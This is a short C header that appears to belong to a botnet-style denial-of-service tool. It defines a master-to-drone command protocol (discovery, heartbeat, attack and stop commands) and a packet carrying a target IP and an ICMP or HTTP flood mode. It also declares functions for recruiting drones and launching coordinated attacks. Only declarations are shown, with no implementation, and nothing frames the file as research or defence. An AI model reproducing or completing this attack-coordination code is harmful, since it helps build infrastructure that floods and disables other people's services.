#ifndef CLUSTER_H
#define CLUSTER_H

#include <stdint.h>
#include <netinet/in.h>

#define CLUSTER_PORT 7123
#define CLUSTER_MAGIC 0xDEADBEEF

typedef enum {
    CMD_DISCOVERY   = 1,
    CMD_OFFER       = 2,
    CMD_ATTACK      = 3,
    CMD_STOP        = 4,
    CMD_HEARTBEAT   = 5
} cluster_cmd_t;

typedef struct {
    uint32_t magic;
    uint32_t cmd;
    char sender_ip[INET_ADDRSTRLEN];
    
    char target_ip[INET_ADDRSTRLEN];
    int attack_mode; // 0=ICMP, 1=HTTP
} cluster_packet_t;

// API
void run_drone_mode(const char *master_ip);
void init_cluster_manager();
void discover_drones();
void send_cluster_attack(const char *target_ip);
void stop_cluster_attack();
int get_drone_count();

#endif
